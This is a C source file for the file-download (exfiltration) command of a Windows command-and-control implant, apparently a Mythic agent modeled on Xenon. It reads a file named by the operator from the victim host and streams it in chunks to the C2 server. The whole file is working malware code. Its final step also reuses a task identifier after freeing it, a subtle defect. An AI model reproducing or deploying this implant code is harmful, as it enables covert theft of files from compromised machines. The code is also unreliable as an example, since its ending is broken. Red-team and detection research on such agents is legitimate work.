#include <windows.h>
#include <stdio.h>
#include "download.h"
#include "../Command.h"
#include "../Utils.h"

BOOL executeDownload(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) return FALSE;

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    // 3. Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    if (!cmdBytes)
    {
        LocalFree(taskUuid);
        return FALSE;
    }

    PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 1);
    memcpy(path, cmdBytes, cmdLen);
    path[cmdLen] = '\0';
    LocalFree(cmdBytes);

    LOG("[*] Starting download for: %s", path);

    // Open File
    HANDLE hFile = CreateFileA(
        path, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        LOG("[-] Failed to open file");
        // Send error
        PPackage responseTask = PackageCreate();
        PackageAddByte(responseTask, POST_RESPONSE);
        PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
        char* err = "Failed to open file.";
        PackageAddBytesRaw(responseTask, (PBYTE)err, strlen(err));
        PParser errResp = sendPackage(responseTask);
        if (errResp) ParserDestroy(errResp);
        PackageDestroy(responseTask);
        
        LocalFree(path);
        LocalFree(taskUuid);
        return FALSE;
    }

    // Get File Size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize))
    {
        LOG("[-] Failed to get file size");
        CloseHandle(hFile);
        LocalFree(path);
        LocalFree(taskUuid);
        return FALSE;
    }

    // Calculate chunks
    #define CHUNK_SIZE (512 * 1024)
    DWORD totalChunks = (DWORD)((fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);
    
    LOG("[*] File size: %lld, Total chunks: %lu", fileSize.QuadPart, totalChunks);

    // 4. Send Download Start (DOWNLOAD_INIT)
    // Xenon Format: [Opcode][TaskUUID][TotalChunks][FilePath][ChunkSize]
    PPackage startPkg = PackageCreate();
    PackageAddByte(startPkg, DOWNLOAD_START);
    PackageAddBytes(startPkg, (PBYTE)taskUuid, uuidLen); // TaskUUID
    PackageAddInt32(startPkg, totalChunks);              // TotalChunks
    PackageAddBytes(startPkg, (PBYTE)path, strlen(path));// FilePath
    PackageAddInt32(startPkg, CHUNK_SIZE);               // ChunkSize
    
    PParser response = sendPackage(startPkg);
    PackageDestroy(startPkg);
    
    if (!response)
    {
        LOG("[-] No response from DOWNLOAD_START");
        CloseHandle(hFile);
        LocalFree(path);
        LocalFree(taskUuid);
        return FALSE;
    }
    
    // 5. Check response for FileID
    // Xenon Format assumption for response: [FileUUID] (String/Bytes)
    // Wait, Xenon uses ParserStringCopy in DownloadSync, which implies it expects a string.
    // We can just grab bytes.
    
    // Check if we need to check Opcode? My previous code did. Xenon doesn't seem to explicitly check opcode in DownloadSync, it just parses.
    // But my `sendPackage` implementation might return just the data payload?
    // Let's assume it returns the parser for the response body.
    
    // If there is an int32 at the start (status?), Xenon: "UINT32 Status = ParserGetInt32(Response);"
    // So we should read that first.
    UINT32 status = ParserGetInt32(response);
    if (status != 0)
    {
        LOG("[-] Error status from C2: %d", status);
        ParserDestroy(response);
        CloseHandle(hFile);
        LocalFree(path);
        LocalFree(taskUuid);
        return FALSE;
    }

    SIZE_T fileIdLen = 0;
    PBYTE fileId = ParserGetBytes(response, &fileIdLen);
    
    ParserDestroy(response);

    if (!fileId)
    {
        LOG("[-] Failed to get FileID");
        CloseHandle(hFile);
        LocalFree(path);
        LocalFree(taskUuid);
        return FALSE;
    }
    
    // Xenon treats FileID as a string (UUID). Let's assume it is.
    LOG("[+] Got FileID. Starting chunk upload...");

    // 6. Loop Chunks
    PBYTE chunkBuf = (PBYTE)LocalAlloc(LPTR, CHUNK_SIZE);
    if (!chunkBuf)
    {
        LocalFree(fileId);
        CloseHandle(hFile);
        LocalFree(path);
        LocalFree(taskUuid);
        return FALSE;
    }

    DWORD bytesRead = 0;
    UINT32 chunkNum = 1;

    while (chunkNum <= totalChunks)
    {
        if (ReadFile(hFile, chunkBuf, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0)
        {
            // Xenon Format: [Opcode][TaskUUID][ChunkNum][FileUUID][ChunkData][BytesRead]
            PPackage chunkPkg = PackageCreate();
            PackageAddByte(chunkPkg, DOWNLOAD_CHUNK);
            PackageAddBytes(chunkPkg, (PBYTE)taskUuid, uuidLen); // TaskUUID
            PackageAddInt32(chunkPkg, chunkNum);                 // ChunkNum
            PackageAddBytes(chunkPkg, fileId, fileIdLen);        // FileUUID
            PackageAddBytes(chunkPkg, chunkBuf, bytesRead);      // ChunkData
            PackageAddInt32(chunkPkg, bytesRead);                // BytesRead

            PParser chunkResp = sendPackage(chunkPkg);
            PackageDestroy(chunkPkg);
            
            if (chunkResp) ParserDestroy(chunkResp);
            
            chunkNum++;
            
            // Sleep(10); // Minimal sleep
        }
        else
        {
            break;
        }
    }
    
    LocalFree(chunkBuf);
    LocalFree(fileId);
    CloseHandle(hFile);
    LocalFree(path);
    LocalFree(taskUuid);
    
    LOG("[+] Download complete.");
    
    // Send completion message mechanism is likely implicit in Mythic by sending total chunks?
    // Xenon calls `PackageComplete(File->TaskUuid, NULL);` at the end.
    // I don't have PackageComplete. I'll send a POST_RESPONSE with "Download finished".
    
    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    char* msg = "Download finished.";
    PackageAddBytesRaw(responseTask, (PBYTE)msg, strlen(msg));
    PParser finalResp = sendPackage(responseTask);
    if (finalResp) ParserDestroy(finalResp);
    PackageDestroy(responseTask);
    return TRUE;
}
